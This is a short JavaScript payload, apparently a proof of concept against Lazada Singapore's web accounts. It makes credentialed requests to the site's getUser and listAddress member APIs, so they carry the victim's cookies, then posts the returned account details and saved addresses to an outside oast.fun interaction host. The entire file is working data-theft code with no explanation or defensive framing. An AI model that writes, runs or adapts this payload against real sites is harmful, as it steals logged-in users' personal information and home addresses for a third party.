// Create a new XMLHttpRequest object
var xhr = new XMLHttpRequest();

// Set up the first request
xhr.open('GET', 'https://member.lazada.sg/user/api/getUser', true);
xhr.withCredentials = true; // Send cookies with the request

var acc_details, address_user;

// Define what happens on successful data retrieval
xhr.onload = function() {
  if (xhr.status >= 200 && xhr.status < 300) {
    // Store the data from the first request
    acc_details = xhr.responseText;

    // Create a new XHR object for the second request
    var secondXhr = new XMLHttpRequest();

    // Set up the second request
    secondXhr.open('GET', 'https://member.lazada.sg/address/api/listAddress', true);
    secondXhr.withCredentials = true; // Send cookies with the request

    // Define what happens on successful data retrieval
    secondXhr.onload = function() {
      if (secondXhr.status >= 200 && secondXhr.status < 300) {
        // Store the data from the second request
        address_user = secondXhr.responseText;

        // Create a new XHR object for the webhook request
        var webhookXhr = new XMLHttpRequest();

        // Prepare the request to the webhook
        webhookXhr.open('POST', 'https://dcjxbdrdfofczyhvgdxsnog10mrcp4l8i.oast.fun', true);
        webhookXhr.setRequestHeader('Content-type', 'application/json');

        // Define what happens on successful data sending
        webhookXhr.onload = function() {
          if (webhookXhr.status >= 200 && webhookXhr.status < 300) {
            // Request was successful
            console.log('Data sent successfully to the webhook.');
          } else {
            // Request failed
            console.error('Request failed with status: ' + webhookXhr.status);
          }
        };

        // Handle any errors during the webhook request
        webhookXhr.onerror = function() {
          console.error('Request failed');
        };

        // Send the combined data to the webhook
        webhookXhr.send(JSON.stringify({ acc_details: acc_details, address_user: address_user }));
      } else {
        console.error('Request failed with status: ' + secondXhr.status);
      }
    };

    // Handle any errors during the second request
    secondXhr.onerror = function() {
      console.error('Request failed');
    };

    // Send the second request
    secondXhr.send();
  } else {
    console.error('Request failed with status: ' + xhr.status);
  }
};

// Handle any errors during the first request
xhr.onerror = function() {
  console.error('Request failed');
};

// Send the first request
xhr.send();
